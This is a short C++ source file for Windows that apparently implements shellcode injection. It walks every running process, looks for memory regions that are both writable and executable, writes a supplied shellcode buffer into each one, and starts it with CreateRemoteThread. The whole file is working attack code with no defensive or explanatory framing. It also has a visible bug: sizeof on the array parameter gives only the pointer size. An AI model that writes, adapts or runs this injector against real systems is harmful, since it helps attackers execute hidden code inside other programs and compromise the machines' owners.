#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <string>
#include <deque>


struct PROCESS_INFO {
	DWORD pid;
	WCHAR* procName;
	PVOID address;
	HANDLE handle;
	BOOLEAN canInject ;
} ;


VOID Inject(unsigned char shellcode[])
{
	LPVOID offset = 0;
	PROCESS_INFO procInfo = {};
	MEMORY_BASIC_INFORMATION mbi = {};
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if (hSnap != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32 procEntry;
		procEntry.dwSize = sizeof(PROCESSENTRY32);

		if (Process32First(hSnap, &procEntry))
		{

			while (Process32Next(hSnap, &procEntry))
			{
				procInfo.pid = procEntry.th32ProcessID;
				procInfo.procName = procEntry.szExeFile;
				procInfo.handle = OpenProcess(MAXIMUM_ALLOWED, FALSE, procInfo.pid);

				if (procInfo.handle)
				{
					std::wcout << procInfo.procName << "\n";
					while (VirtualQueryEx(procInfo.handle, offset, &mbi, sizeof(mbi)))
					{
						offset = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
						if (mbi.AllocationProtect == PAGE_EXECUTE_READWRITE && mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE)
						{
							std::cout << "\tRWX: 0x" << std::hex << mbi.BaseAddress << "\n";
							WriteProcessMemory(procInfo.handle, mbi.BaseAddress, shellcode, sizeof(shellcode), NULL);
							CreateRemoteThread(procInfo.handle, NULL, NULL, (LPTHREAD_START_ROUTINE)mbi.BaseAddress, NULL, NULL, NULL);
						}
					}
					offset = 0;
					CloseHandle(procInfo.handle);
				}
			}
		}
	}
	CloseHandle(hSnap);
}







